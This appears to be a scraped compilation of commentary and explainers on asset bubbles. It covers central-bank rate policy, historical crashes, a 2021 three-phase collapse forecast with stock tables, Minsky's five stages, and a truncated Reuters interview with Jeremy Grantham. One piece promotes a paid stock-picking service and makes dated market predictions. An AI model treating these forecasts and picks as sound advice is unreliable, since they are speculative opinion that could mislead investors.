The main culprit in Australia’s asset bubble and unfolding economic disaster is the Reserve Bank, which maintains a net-zero interest rate policy and a laughable commitment to not raise rates despite the clear and present inflationary threat.

Governments of all persuasions are also complicit. The federal government’s inept JobKeeper donation to the rich-listers may be the most public example, but almost every tax loophole (like the principal capital gains tax exemption or negative gearing) is aligned to ensuring the rich get richer, while the young and poor continue to get screwed.

Unless you believe that this time is really different (hint: it never is), there will inevitably be an almighty reckoning. And it won’t be pretty.

Absolutely. Do I believe it will burst? As in all prior bubbles, this too will burst – and we may be closer to that event than we think.

Historically, the most frequent catalyst of a bubble-bursting is rising inflation and interest rates.

Bubbles, and related exuberance, encourage large amounts of borrowing and margin investing, both of which can cause pain when rates rise. Moreover, fast-growth companies, whose valuations incorporate overly optimistic assumptions about the future, are severely affected by rising interest rates.

What causes bubbles?

For starters, it is human nature. Humans are overconfident momentum traders; they like to buy winners, a process that drives prices up further. Prices eventually rise so much above fundamentals that this sets the stage for a reversal, when inflation and interest rates start to rise.

Financial innovation historically led to momentum crazes toward the new securities that investment bankers and merchant houses created, which made people justify any kind of valuations, everything from the South Sea Co. to the Dutch tulip mania. Financial innovations fuelled large amounts of borrowing and margin investing and caused bubbles to burst when inflation and interest rates started to increase.

A classic example in more recent history is Long Term Capital Management (LTCM). Its highly leveraged portfolio was premised on the idea that the future will look much like the past – in terms of the relationship between various securities and on which their equity and bond arbitrage were based. The 1998 financial crisis in Russia, which made all securities highly correlated, made LTCM sustain huge losses and led to its demise. Interest rates were on the rise at the time – the federal funds rate rose from 4.73 per cent at the end of 1995 to 5.53 per cent in June, 1998.

The “Black Monday” stock market crash of Oct. 19, 1987, was caused by computer-driven program trading that relied on portfolio insurance to hedge a portfolio against market risk – insurance that failed when it was most needed. This event occurred in a rising rate environment: The fed funds rate rose from about 6 per cent at the beginning of 1987 to 7.4 per cent by the end of September, 1987.

The dot-com mania of late nineties and subsequent market crash also happened in a rising rate environment. The fed funds rate rose from 4.27 per cent at the end of 1998 to 6.5 per cent by August, 2000.

The Great Recession of 2008-09 and the U.S. housing-industry collapse also happened in a rising interest rate environment. The fed funds rate rose from about 1 per cent in 2004 to 5.5 per cent in 2007.

Where do we stand currently?

Human nature and margin investing: Buying stocks on margin is skyrocketing. Margin debt has recently experienced its greatest increase of the past 20 years. Individual investors are investing in greater numbers in the market. Retail investors are notoriously bad market timers; they are exuberant at the market peaks and panic stricken at market bottoms. Inflows on exchange-traded funds and U.S. equity funds have exploded.

Financial innovation: Financial-services company Robinhood has made investing look like a game and encourages frequent trading, especially by novice investors. Social networks, such as Reddit, have created a new class of investing “experts.” Then there’s the emergence of cryptocurrencies that live on the blockchain and backed by nothing real. And let’s not forget the popularity of special purpose acquisition companies, with more SPAC capital raised in 2020 than in any previous year in history.

Other signs of market exuberance:

The Bull/Bear survey by the American Association of Individual Investors, taken at the end of April, indicates bullish investors outnumber the bearish investors by 32 points. The AAII survey is historically a contrarian indicator, and when the spread exceeds 20 points there is reason for concern.

Second, the CBOE Volatility Index, or VIX, indicates that the fear of a market correction is at a very low level. Again, a contrarian indicator.

Third, cash balances of professional money managers are well below historical levels.

Fourth, the ratio of insider sales to buys indicates that there are 143 sales for every buy by insiders, according to recent data from Richardson Wealth.

Fifth, the emergence and popularity of leveraged loans – mergers that are taking place at elevated multiples – and rising global debt are flashing red.

Finally, valuation metrics point to a richly valued market – for example, equity value to GDP stands at the highest level since the 1950s – with the only exception the 1999-2000 tech bubble – while the Wilshire 5000 Total Market Index to GDP ratio has reached a record high.

While the fed funds rate has remained stagnant to date, with inflation simmering, it is only a matter of time before it starts rising – market rates have already risen, with the 10 year U.S. Treasury yield having gone from 0.6 per cent to 1.6 per cent in matter of a few months.

With a nod to famed investor Seth Klarman, who once declined an invitation to invest in LTCM, “outlier” events are what kill portfolios, especially when the portfolios are overleveraged.

The major S&P 500 (SPY) and Nasdaq Composite (QQQ) indices are up over 20% year-to-date and trading near their all-time highs. 2021 has been a very strong year for ""the stock market.""

In contrast, there are dozens of stocks, especially in the small cap space, which are down 20%, 50% or even 80% from their yearly highs. ""The market of stocks"" has clearly been much more challenging in 2021.

Many investors are scratching their heads on what's happening with equities these days. How can such significant divergences between individual stock returns exist? Will this trend continue in 2022?

Investors who have been following my articles know that I have a clear theory for this phenomenon: The 2021 bubble. What we experienced in 2021 so far was the first phase of the collapse of this bubble. But there is more to come...

I believe that the recent downturn can be categorized as the second phase of the bubble collapse. Finally, I expect the last phase of the bubble collapse, phase 3, to occur in 2022. Indices will likely continue soaring until this final phase kicks off.

What exactly are these three phases and how should you position your portfolio with a further collapse of the bubble ahead of us? That's what I will discuss in this article. But before doing so, let's quickly recap how this bubble has been formed.

The Cause of The 2021 Financial Bubble

One word: COVID-19.

While markets have already been running hot prior to 2020, ironically it has primarily been the global health crisis which caused the bubble.

The pandemic has led to several events that inflated the bubble:

The Fed printed $4.5 trillion and decreased interest rates to zero. By implementing these stimuli, it was aiming to combat record unemployment rates of 14.8% and recover the economic damage. This unprecedented amount of stimuli caused a major disruption in asset prices and increased the risk appetite of investors. Why would you not take risks if you have a powerful central bank to back you up with free money if things turn south? As the global lockdown forced us to stay at home, many new people started investing. This new wave of investors primarily consisted of millennials who had no regard for valuations and loved taking high amounts of risks. On top of that, brokers like Robinhood did everything to win these new customers by easing their policies regarding high-risk practices such as buying with margin debt and playing with options. The pandemic let to an acceleration of technological developments. As such, disruptive tech stocks became more attractive than ever given their soaring growth rates. Many investors believed these high growth rates would persist for many years. As such, these tech stocks were seen as great buying opportunities even when they were trading at extremely expensive valuations.

These three drivers were so strong that it led to a new paradigm of investing: Risk-averse strategies like Warren Buffett's were buried in the ground, while risk-taking strategies like Cathie Wood's were endorsed. Those who didn't follow the latter would be left behind with significant underperformance, almost every investor said.

Phase 1 Of the 2021 Bubble Collapse: Hyped Small Caps (February 2021)

I was becoming suspicious of the start of a stock market bubble when the S&P 500 reached pre-COVID highs and many hype stocks experienced massive gains in the summer of 2020.

It was eventually my analysis of the IPO market in December 2020, ""2020 IPO Bubble Just Reached Dot-Com Levels,"" which made me confident in calling this a bubble. In this article, I explicitly warned investors about the risks with following overvalued hype stocks, but also suggested to stay invested in other (value) equities:

Following the herd by buying hyped stocks can be a very costly mistake which I strongly discourage investors to do. However, selling out of all your stocks or going full short on the market is another mistake which can be as bad or even worse than the first one!

At our investment community Insider Opportunities we put our money where our mouth was, buying many undiscovered value stocks at great prices instead of following the hype.

For another month or two, the so-called ""Cathie Wood investors,"" ""TikTok investors"" or ""new normal investors"" had their fun with investing in extremely expensive hype stocks. However, in February 2021 things changed drastically for hyped small caps with excessive EV/revenues multiples (or even zero revenues):

Company Return since 2021 peak EV/revenues ratio at peak ARK Innovation ETF (ARKK) -37% NA Virgin Galactic Holdings (SPCE) -74% No revenues Plug Power (PLUG) -49% No revenues Palantir Technologies (PLTR) -50% 56x Fastly Inc (FSLY) -55% 45x Skillz Inc (SKLZ) -80% 69x Lemonade (LMND) -74% 105x AMC Entertainment Holdings (AMC) -51% 75x C3.ai Inc (AI) -83% 88x Fiverr (FVRR) -59% 60x

Calling the sell-off of these unprofitable, expensively valued, hyped stocks was not just a wild guess. It's a common phenomenon in financial bubbles that the weakest chains collapse much earlier than the rest of the market.

For example, this was exactly what happened during the dot com bubble. Many unprofitable, hyped small caps back then collapsed in 1999, while it took until March 2000 for the general Nasdaq Index to peak. Some examples include online groceries company Webvan (peak at December 1999), consumer health care company drkoop.com (peak at July 1999) and online toys seller Etoys.com (peak at September 1999).

These stocks more than halved before the Nasdaq Index peaked and eventually went out of business a couple of years later. I would not be surprised if some of the companies listed in the table above would declare bankruptcy in the coming years as well.

Phase 2 of The 2021 Bubble Collapse: Overvalued Mid Caps (November 2021)

Over the course of 2021 investors sold off overhyped small caps and searched for other investments to grow wealth in the market. Strongly growing mid cap tech stocks came into the picture as they provided similar potential with lower risks.

The amount of money that flew into these stocks was so significant that many of them gained hundreds of percentages over the course of 2021 in addition to an already strong 2020.

As a consequence of valuations having grown to unsustainable levels, these investments became extremely risky as well. As valuation risks became unbearable and macro-economic challenges increased, this asset class started to sell off significantly in November.

As shown in the table below, many mid-cap growth stocks are down double digits over the past two weeks, with some even losing as much as 50%:

Company Return since Nov. 15 2021 EV/revenues ratio at Nov. 15 CrowdStrike (CRWD) -22% 50x Cloudflare (NET) -24% 112x Asana (ASAN) -51% 84x Upstart (UPST) -25% 31x DocuSign (DOCU) -47% 29x Bill.com (BILL) -28% 105x Roku Inc (ROKU) -27% 14x Unity Software (U) -27% 55x DoorDash (DASH) -36% 17x Sprout Social (SPT) -25% 39x

We believe that November 2021 might have been the start of the second phase of the bubble collapse, the phase where overvalued mid-caps plunge.

Again, history has proven that such high-quality but overvalued mid caps tend to sell off before the market indices do. Amazon (AMZN) and Intuit (INTU) are two great examples which belonged to this category during the dot com bubble. They peaked four months prior to the Nasdaq.

Data by YCharts

Note that it took these stocks respectively 10 and eight years to recover to their dot com highs despite the fact that the underlying fundamentals have been stellar.

There are growth investors who say valuations don't matter. I respectfully disagree.

While some of the stocks listed above might turn out to become stellar investments for the coming 20 years, investors need to be aware of the possibility that they will crash in the coming months and will need many years to recover to today's levels.

Phase 3 of The 2021 Bubble Collapse: Overvalued Large Caps and Indices (Spring 2022?)

If you read my article ""QQQ: Be Prepared For The Biggest Tech Rally In Your Lifetime,"" you might think I'm crazy. First I'm predicting a huge rally for the Nasdaq and three weeks after I explain why the tech bubble will continue to collapse.

Well, let me explain this discrepancy. The top 10 holdings (out of a total of 100) represent 57.7% of the total Nasdaq Index. Therefore, the QQQ almost solely reflects the price movements of these big tech stocks.

Despite the general turmoil in financial markets over the past months, big tech stocks have stayed remarkably steady, even during the sharp tech sell-off in November:

Many investors see big tech stocks as the new safe haven. Indeed, their stocks face very low volatility, they have robust balance sheets, generate impressive operating margins (25.9% average) and grow consistently (20.8% average).

Given their strong fundamentals, these stocks deserve a higher P/E multiple. On average, the top 10 big tech stocks trade at a 79.1x P/E and if we leave out outlier Tesla they trade at a 48.9x P/E ratio.

Company QQQ weight P/E ratio Revenue 3-year CAGR 2018-2021 3-year PEG Operating margin Apple Inc (AAPL) 11.87% 29.1x 11.3% 2.58x 29.8% Microsoft (MSFT) 10.81% 36.9x 15.1% 2.44x 42.1% Alphabet Inc. (GOOG) 7.65% 27.7x 20.5% 1.35x 30.3% Amazon.com Inc. (AMZN) 7.60% 67.2x 25.3% 2.66x 6.2% Tesla Inc. (TSLA) 5.92% 351x 29.7% 11.82x 9.8% NVIDIA Corp. (NVDA) 5.21% 99x 27.5% 3.60x 35.5% Meta Platforms Inc. (FB) 3.23% 22.1x 26.2% 0.84x 41.8% Adobe Inc. (ADBE) 2.08% 55.6x 18.7% 2.97x 36.5% Netflix Inc. (NFLX) 1.81% 55.5x 21.9% 2.53x 22.8% Costco Wholesale (COST) 1.55% 46.6x 11.4% 4.09x 3.7% Average 79.1x 20.8% 3.49x 25.9%

It is time for me to correct a common misunderstanding about the dot com bubble. Many people believe that today is totally different with 2000 because two decades ago, companies were much less profitable than today. Well, that's wrong.

As you can see in my table below, the top 10 Nasdaq companies of 2000 generated an average operating profit margin of 25.5% (excl. Worldcom). Indeed, the tech leaders of 2000 were cash flow machines as much as the tech leaders are today.

One might even argue that the tech leaders of 2000 were fundamentally stronger companies than today, given that their growth rates were much higher (48.8% vs 20.8%).

Yes, P/E valuations are not that extreme right now. Interestingly though, the average PEG ratio of today (3.49x) is creeping very close to the dot com number (5.03x).

Company Market cap P/E ratio Revenue 3-year CAGR 1997-2000 3-year PEG Operating margin Microsoft (MSFT) $713 bln 63x 24.4% 2.58x 47.6% Cisco Systems Inc (CSCO) $633 bln 162x 42.8% 3.78x 17.1% Intel Corp (INTC) $545 bln 52x 10.3% 5.04x 30.8% Oracle Corp (ORCL) $313 bln 333x 15.0% 22.2x 30.4% Sun Microsystems Technology Inc $200 bln 118x 22.3% 5.29x 15.7% Worldcom Group $180 bln 35x 71.6% 0.49x -110.0% Dell (DELL) $178 bln 75x 48.0% 1.56x 9.0% Qualcomm Inc (QCOM) $131 bln 177x 69.1% 2.56x 22.6% Yahoo Inc $127 bln 648x 150.6% 4.30x 26.8% Applied Materials Technology (AMAT) $101 bln 76x 30.4% 2.50x 29.2% Average 173.9x 48.8% 5.03x 25.5%

Big tech companies in 2000 were seen as safe haven as well. Later, investors discovered that these companies were not as indestructible as they believed and that prior growth rates were unsustainable. Astonishingly, the three-year revenue CAGR between 1997 and 2000 of 48.8% reversed to -2.2% during the 2000-2003 timeframe.

Investors need to be aware that the recent big tech growth rates are highly unsustainable. They benefited strongly from the pandemic and central bank stimuli. As these two tailwinds are easing in the coming quarters, we need to be prepared for a possible reversal to single-digit or even negative growth rates for big tech stocks soon.

As explained in my prior QQQ article, I believe money can keep rotating toward big tech stocks in the coming months, leading to a last extreme market rally. However, this is likely to stop when investors begin realizing that they need to factor in much lower growth rates in their valuation models.

I believe that the downturn of big tech and indices, phase 3, will start during spring of 2022.

How To Invest During This Bubble Collapse

At Insider Opportunities, we continue doing what we are good at: Investing in significantly undervalued stocks. By following the personal purchases of insiders, the leaders of the firm who know better than anyone else when their stock is undervalued compared to its growth perspectives, we are increasingly confident that our investments will generate strong mid-to-long term returns.

In 2021, insiders have been buying heavily into small-cap value names who have underperformed as money rotate away from them into big tech. This asset class is currently reaching P/E ratios (14x) not seen since 2011. We believe that picking the right stocks out of them will generate solid returns in each market environment, even when the bubble collapses further.

For example, instead of following the herd into the high-risk fund ARKK, in March we started a significant position in the defensive asset manager Diamond Hill Group. This undiscovered stock with great fundamentals was trading at a 12x P/E and had 20% of its market cap in cash. This investment generated us 42% returns to date.

Over the past weeks, we're experiencing a new pattern among insiders. The smart money is increasingly buying stocks of growth stocks that were sold off heavily during this bubble collapse. As such, we are also cautiously allocating more money to unjustifiably sold off growth stocks. However, as we might achieve a further deterioration of this sector, it's important to be highly selective with growth stocks. Only pick out those with great balance sheets and an attractive valuation compared to growth perspectives. I will write a separate article soon about three very attractive growth stocks.

Lastly, we suggest to have enough cash (10-20%) or cash-equivalent investments (defensive stocks, bonds, etc.) available to benefit from more opportunities in the coming months.

Investor takeaway

Stock market movements have been highly disturbing in 2021: Indices continue reaching new all-time highs while tons of individual stocks went down drastically.

Understanding the three phases of a bubble collapse can give you an edge over other investors to better read this market:

Phase 1 - Hyped small caps collapse: The weakest chains of the bubble always collapse first. That's why you saw no-revenue hype stocks like SPCE or extremely overvalued small cap growth stocks like SKLZ getting slaughtered since February 2021. Most of these stocks will never recover to the peak levels they traded at last year. Phase 2 - Overvalued mid caps collapse: Mid-cap growth stocks' valuation multiples expanded to unsustainable levels as money rotated into them. These are oftentimes much stronger businesses, but that does not justify 30-100x EV/sales ratios. It looks like November 2021 was the start of their collapse to more appropriate valuations. It will take many years for these stocks to recover to their 2021 peaks. However, some still have the ability to generate strong returns for the very long term. Phase 3 - Overvalued large caps and indices: Big tech is attracting lots of investors as they are seen as the new safe havens. Investors are forgetting that even big tech stocks are not indestructible and might face negative growth rates soon. Once they realize this, valuations will need to come down substantially and will bring down stock market indices with them.

By Daniel Lacalle

The history of economic development cannot be understood without the importance of recession periods. Recessions are often the result of the excess accumulated in previous years. Creative destruction after a period of excess used to drive a stronger recovery and continued economic development. That was until risky assets became the biggest concern for policymakers.

From the late seventies and early eighties' US housing slump and automobile industry crisis to the technology and housing bubble burst there is a clear process of causation created by interest rate policy.

Constant decreases in interest rates lead to excessive risk-taking, complacency and accumulation of exposure to increasingly expensive assets under the perception that there is no risk.

Bubbles become larger and more dangerous because interest rates are kept abnormally low for a prolonged period and it disguises risk, clouding citizens’ and investors’ perception of danger in elevated valuations. Cheap money leads to generalized and dangerous risk exposure.

After every recession, central banks keep rates too low for too long even in growth periods because policymakers fear asset price corrections, and this leads to complacency and the creation of bubbles everywhere.

Once policymakers decide to raise rates, they often cause a recession because the amount of risk taken by even the most conservative investor or household is simply too high. By the time that central banks decide to finally raise rates the bubbles are already more than a market headline, but a dangerous and widespread accumulation of risk that negatively affects millions of unsuspecting citizens.

The question is what is worse, the rate cuts or the rate hikes? Rate hikes tend to trigger recessions, as Jesse Colombo or Lance Roberts have shown in numerous charts, but what causes them is previous extraordinary levels of accumulated risks throughout the economy.

The boom-and-bust cycle is more severe and frequent, as we have seen since the late seventies. That is why central banks never truly normalize policy, rates remain in negative territory in real terms. And investors know it. That is why there is a perverse incentive for households, businesses, and investors to buy any correction.

The fear of interest rate hikes allows us to analyse what has happened in other similar periods.

Between 1985 and 1990, the Fed raised rates 325 basis points and the S&P 500 rose 45 percent. The rate hike cycle drove emerging economies like Mexico to the ground and states like California went bankrupt.

Between 1993 and 2000, the Fed also raised rates by 325 basis points and the US stock market shot up 225 percent. In that period, we saw the Tech bubble burst and the early 2000s recession. In the 2003 to 2007 period, the Fed raised rates by 375 basis points and the market rose 30 percent. It brought the great financial crisis and the housing bubble burst.

Between 2015 and 2020, rates rose 200 basis points and the US index advanced 65 percent. In that period, in 2018, we saw the Fed change its rate hike course rapidly after a market correction.

Will the Federal Reserve change its rate hike plan this time? History shows us that central banks care much more about risky assets - stocks and bonds - than they say and certainly a lot more than they do about inflation.

At the beginning of 2016, faced with a cycle of expected rate hikes, the S&P 500 corrected 11.3 percent until January 20th. The Federal Reserve ended up raising rates just once that year despite announcing four hikes. Why did they change? “Geopolitical risk and weakening financial conditions”. Exactly what is happening now.

In December 2018, after years of a bull market, the US stock market fell by 9 percent, and on January 3rd, 2019, it corrected another 3.5 percent. The next day, the Federal Reserve announced that it was “going to be patient” and stopped its rate hike path on its tracks.

It is true that inflation was not 7 percent then and the Federal Reserve may probably be more tolerant of a market correction than when the US CPI was 3 percent, but we cannot forget that history shows us that central banks always maintain looser conditions than it seems from their messages and headlines.

The evidence of the United States economic slowdown is everywhere. Retail sales, job creation, stagnant labor force participation, declining real wages and slowing capital expenditure. To all this we must add the continued rise in energy commodities due to the Ukraine tensions.

The Federal Reserve is aware of the “bubble of everything” created in recent years and the elevated levels of debt throughout the economy. Unfortunately, the Fed has already left rates low, and asset purchases high, for too long to prevent an inevitable negative economic effect. Even worse, the solution will likely be to repeat the same policies that created the conditions for excess.

A basic characteristic of financial bubbles is the suspension of disbelief by most participants when the speculative price surge is occurring: It's only in retrospect, after the bubble has burst, that they're recognized (to many an investor's chagrin). Nevertheless, some economists have identified five stages of a bubble—a pattern to its rise and fall—that could prevent the unwary from getting caught in its deceptive clutches.

Key Takeaways Bubble, in an economic context, generally refers to a situation where the price for something—an individual stock, a financial asset, or even an entire sector, market, or asset class—exceeds its fundamental value by a large margin.

Financial bubbles, aka asset bubbles or economic bubbles, fit into four basic categories: stock market bubbles, market bubbles, credit bubbles, and commodity bubbles.

Bubbles are deceptive and unpredictable, but understanding the five stages they characteristically go through can help investors prepare for them.

The five steps in the lifecycle of a bubble are displacement, boom, euphoria, profit-taking, and panic.

The damage caused by the bursting of a bubble depends on the economic sector(s) involved, whether the extent of participation is widespread or localized, and to what extent debt fueled the investments that inflated the bubble.

1:53 5 Steps of a Bubble

Economic Bubbles

The term ""bubble,"" in an economic context, generally refers to a situation where the price for something—an individual stock, a financial asset, or even an entire sector, market, or asset class—exceeds its fundamental value by a large margin. Because speculative demand, rather than intrinsic worth, fuels the inflated prices, the bubble eventually but inevitably pops, and massive sell-offs cause prices to decline, often quite dramatically. In most cases, in fact, a speculative bubble is followed by a spectacular crash in the securities in question.

The damage caused by the bursting of a bubble depends on the economic sector(s) involved, and also whether the extent of participation is widespread or localized. For example, the bursting of the equity and real estate bubbles in Japan in 1989–1992 led to a prolonged period of stagnation for the Japanese economy—so long that the 1990s are referred to as the Lost Decade. In the U.S., the burst of the dotcom bubble in 2000 and the residential real estate bubble in 2008 led to severe recessions.

Types of Asset Bubbles

Theoretically, there is an infinite number of asset bubbles—after all, a speculative frenzy can arise over anything, from cryptocurrencies like Bitcoin & Dogecoin to meme stocks like Gamestop & AMC to housing prices to tulip bulbs (just to cite a couple of real-life examples). But in general, asset bubbles can be broken down into four basic categories:

Stock market bubbles involve equities—shares of stocks that rise rapidly in price, often out of proportion to their companies' fundamental value (their earnings, assets, etc.). These bubbles can include the overall stock market, exchange-traded funds (ETFs), or equities in a particular field or market sector—like Internet-based businesses, which fueled the dotcom bubble of the late 1990s.

Asset Market bubbles involve other industries or sections of the economy, outside of the equities market. Real estate is a classic example. Run-ups in currencies, either traditional ones like the US dollar or euro or cryptocurrencies like Bitcoin or Litecoin, could also fall into this bubble category.

Commodity bubbles involve an increase in the price of traded commodities, ""hard""—that is, tangible—materials and resources, such as gold, oil, industrial metals, or agricultural crops.

Stock market and market bubbles, in particular, can lead to a more general economic bubble, in which a regional or national economy overall inflates at a dangerously fast clip. Many historians feel the U.S. was overheating in this way in the 1920s, aka ""The Roaring Twenties""—leading to the meltdown of the Crash of 1929 and the subsequent Great Depression.

5 Stages of a Bubble

Economist Hyman P. Minsky was one of the first to explain the development of financial instability and the relationship it has with the economy. In his pioneering book Stabilizing an Unstable Economy (1986), he identified five stages in a typical credit cycle, one of several recurrent economic cycles.

These stages also outline the basic pattern of a bubble.

1. Displacement

A displacement occurs when investors get enamored by a new paradigm, such as an innovative new technology or interest rates that are historically low. A classic example of displacement is the decline in the federal funds rate from 6.5% in July 2000, to 1.2% in June 2003. Over this three-year period, the interest rate on 30-year fixed-rate mortgages fell by 2.5 percentage points to a then-historic low of 5.23%, sowing the seeds for the subsequent housing bubble.

2. Boom

Prices rise slowly at first, following a displacement, but then gain momentum as more and more participants enter the market, setting the stage for the boom phase. During this phase, the asset in question attracts widespread media coverage. Fear of missing out on what could be a once-in-a-lifetime opportunity spurs more speculation, drawing an increasing number of investors and traders into the fold.

3. Euphoria

During this phase, caution is thrown to the wind, as asset prices skyrocket. Valuations reach extreme levels during this phase as new valuation measures and metrics are touted to justify the relentless rise, and the ""greater fool"" theory—the idea that no matter how prices go, there will always be a market of buyers willing to pay more—plays out everywhere.

For example, at the peak of the Japanese real estate bubble in 1989, prime office space in Tokyo sold for as much as $139,000 per square foot. Similarly, at the height of the Internet bubble in March 2000, the combined value of all technology stocks on the Nasdaq was higher than the GDP of most nations.

4. Profit-Taking

In this phase, the smart money—heeding the warning signs that the bubble is about at its bursting point—starts selling positions and taking profits. But estimating the exact time when a bubble is due to collapse can be a difficult exercise because, as economist John Maynard Keynes put it, ""the markets can stay irrational longer than you can stay solvent.""

In Aug. 2007, for example, French bank BNP Paribas halted withdrawals from three investment funds with substantial exposure to U.S. subprime mortgages because it could not value its holdings. While this development initially rattled financial markets, it was brushed aside over the next couple of months, as global equity markets reached new highs. In retrospect, Paribas had the right idea, and this relatively minor event was indeed a warning sign of the turbulent times to come.

5. Panic

It only takes a relatively minor event to prick a bubble, but once it is pricked, the bubble cannot inflate again. In the panic stage, asset prices reverse course and descend as rapidly as they had ascended. Investors and speculators, faced with margin calls and plunging values of their holdings, now want to liquidate at any price. As supply overwhelms demand, asset prices slide sharply.

One of the most vivid examples of global panic in financial markets occurred in Oct. 2008, weeks after Lehman Brothers declared bankruptcy and Fannie Mae, Freddie Mac, and AIG almost collapsed. The S&P 500 plunged almost 17% that month, its ninth-worst monthly performance.

Tulipmania describes the first major financial bubble, which took place in 17th-century Holland: Prices for tulips soared beyond reason, then fell as fast as the flower's petals.

Example of a Stock Bubble: eToys

The Internet bubble around the turn of the 21st century was an especially dramatic one. Numerous Internet-related companies made their public debut in spectacular fashion in the late 1990s before disappearing into oblivion by 2002. The story of eToys illustrates how the stages of a stock bubble typically play out.

A Rosy Start

In May 1999, with the Internet revolution in full swing, eToys had a very successful initial public offering (IPO), where shares at $20 each escalated to $78 on their first trading day. The company was less than three years old at that point and had grown sales to $30 million for the year ended March 31, 1999, from $0.7 million in the preceding year. Investors were very enthusiastic about the stock's prospects, with the general thinking being that most toy buyers would buy toys online rather than at retail stores such as Toys ""R"" Us. This was the displacement phase of the bubble.

While eToys had posted a net loss of $28.6 million on revenues of $30 million in its most recent fiscal year, investors were expecting the financial situation of the firm to take a turn for the best. By the time markets closed on May 20, eToys sported a price/sales valuation that was largely exceeding that of rival Toys ""R"" Us, which had a stronger balance sheet. This marked the boom and euphoria stages of the bubble.

Shortly afterward, eToys shares fell sharply on concerns that potential sales by company insiders could drag down the stock price, following the expiry of lockup agreements that placed restrictions on insider sales. Trading volume was exceptionally heavy that day, at nine times the three-month daily average. By March of 2000, the company had seen a 70% decline in its stock price from its record high of $84, identifying this as the profit-taking phase of the bubble.

Decline and Fall

By the end of Q1 2000, the panic stage had arrived, and the company was still spending an extraordinary $2.27 on advertising costs for every dollar of revenue generated. Although the investors were saying that such expenditures were characteristic of the new economy, such a business model simply is not sustainable.

In July 2000, eToys reported its fiscal first-quarter loss widened to $59.5 million from $20.8 million a year earlier, even as sales tripled over this period to $24.9 million. It added 219,000 new customers during the quarter, but the company was not able to show bottom-line profits. By this time, with the ongoing correction in technology shares, the stock was trading around $5.

Towards the end of the year, with losses continuing to mount, eToys would not meet its fiscal third-quarter sales forecast and had just four months of cash left. The stock, which had already been caught up in the panic selling of Internet-related stocks since March and was trading around at slightly over $1, fell 73% to 28 cents by Feb. 2001. Since the company failed to retain a stable stock price of at least $1, it was delisted from the Nasdaq.

A month after it had reduced its workforce by 70%, eToys fired its remaining 300 workers and was forced to declare bankruptcy. By this time, eToys had lost $493 million over the previous three years and had $274 million in outstanding debt.

""Irrational exuberance is the psychological basis of a speculative bubble,"" wrote economist Robert Shiller in his 2000 book, Irrational Exuberance. He defined a bubble ""as a situation in which news of price increases spurs investor enthusiasm, which spreads by psychological contagion from person to person, in the process amplifying stories that might justify the price increases, and bringing in a larger and larger class of investors who, despite doubts about the real value of an investment, are drawn to it partly by envy of others' successes and partly through a gamblers' excitement.""

What Causes Asset Bubbles? Asset bubbles can begin in any number of ways, and often for sound reasons. Major incubators of bubbles, which often interact or occur in tandem, include: Interest rates might be low, which tends to encourage borrowing for spending, expansion, and investment.

Low-interest rates and other favorable conditions in a nation encourage an influx of foreign investment and purchases.

New products or technologies spur demand and, whenever something's in demand, its price naturally rises (what the economists dub demand-pull inflation).

There are shortages of an asset, causing the cost of it to climb—again, classic supply-and-demand principles. So far, so good: These are all solid factors for appreciation. However, a problem arises when an asset bubble begins, snowball-like, to feed on itself—and to swell out of proportion to the fundamentals, or intrinsic worth, of the assets involved. Opportunistic investors and speculators are plunging in and pushing prices up even more. Why are they doing this? It has to do not with fundamentals but with human foibles—psychological and often irrational thinking and actions about money, known as behavioral financial biases. These behaviors include things like: Herd mentality: doing something because everyone else is

doing something because everyone else is Short-term thinking : just looking at the immediate returns, or thinking you can ""beat the market"" and time a quick exit

: just looking at the immediate returns, or thinking you can ""beat the market"" and time a quick exit Cognitive dissonance: only accepting information that confirms an already-held belief, and ignoring anything that doesn't

What Happens When an Asset Bubble Bursts? A range of things can happen when an asset bubble finally bursts, as it always does, eventually. Sometimes the effect can be small, causing losses to only a few, and/or short-lived. At other times, it can trigger a stock market crash, and a general economic recession, or even depression. Much depends on how big the bubble is—whether it involves a relatively small or specialized asset class, vs. a significant sector like, say, tech stocks or residential real estate. And, of course, how much investment money is involved. Another factor: to what degree debt is involved in inflating the bubble. A major 2015 research study, ""Leveraged Bubbles,"" examined asset bubbles in 17 countries, dating back to the 1870s. It categorized them into four types, but along two basic lines, based on credit—that is, how funded investments were by financing and borrowing. The study found that the more credit involved, the more damaging the bubble's pop. Debt-fueled equity bubbles led to longer-lived recessions. Even worse were leveraged housing bubbles, like the one that popped in 2006-07, leading to the subprime mortgage crisis that kicked off the Great Recession.

What Is an Indicator of an Economic Bubble? One of the tricky things about bubbles is that they're hard to spot while you're in one. Only in hindsight, after they burst, do they become clear. One such was the dotcom bubble that occurred around the turn of the 21st century. It was a rapid rise in U.S. technology stocks, especially those in then-novel Internet-based companies, that helped lift the stock markets in general. The tech-dominated Nasdaq index quintupled in value, from under 1,000 to more than 5,000 between 1995 and 2000. Unfortunately, when many of the new, hot tech companies failed to turn a profit or perform up to expectations, investors soured on them. In 2001-02, the bubble popped. In the ensuing crash, the Nasdaq index fell over 75%. Stocks in general entered a bear market.

What Is a Bubble in Finance? A financial bubble, also known as an economic bubble or an asset bubble, is characterized by a fast, large climb in the market price of different assets. This rapid growth, though, is relatively short-lived—like the bursting of a bubble—and it abruptly reverses course, dragging asset prices down with it, sometimes even lower than their original levels. Typically, a bubble is created out of sound fundamentals, but eventually exuberant, irrational behavior takes over, and the surge is caused by speculation—buying for the sake of buying, in the hopes prices continue to rise.

The Bottom Line

""A rapid price rise, high trading volume, and word-of-mouth spread are the hallmarks of typical bubbles,"" says Timothy R. Burch, an Associate Professor of Finance at the Miami Herbert Business School. ""If you learn of an investment opportunity with dreams of unusually high profits from social media or friends, be particularly wary—in most cases, you’ll need uncanny timing to come out ahead.""

As Minsky and a number of other experts opine, speculative bubbles in some asset or the other are inevitable in a free-market economy. However, becoming familiar with the steps involved in bubble formation may help you to spot the next one and avoid becoming an unwitting participant in it.",Asset Bubble Burst,2017-03-25 16:02:51

NEW YORK, July 20 (Reuters) - In this manic era of meme stocks, cryptocurrencies and real-estate bidding wars, studying the history of financial markets might seem a little dry and old-fashioned.

Except to Jeremy Grantham.

The chairman of the board of famed asset managers GMO is a certified bubble-ologist, fascinated by how and why bubbles emerge. Grantham studies classic ones like 1929, but - now in his eighties - he has also lived through (and called) numerous modern booms and busts, including the dot-com wreckage in 2000, the bull market peak in 2008 and the bear market low in 2009.

In case you did not know where this is headed: He says we are in a bubble right now.

In January Grantham wrote an investor letter, ""Waiting For the Last Dance,"" about an inflating bubble that ""could well be the most important event of your investing lives.""

Six months later, the stock market is starting to show some cracks. Grantham spoke with Reuters about this moment of market history.

Q: When your letter of warning came out, what was the response like?

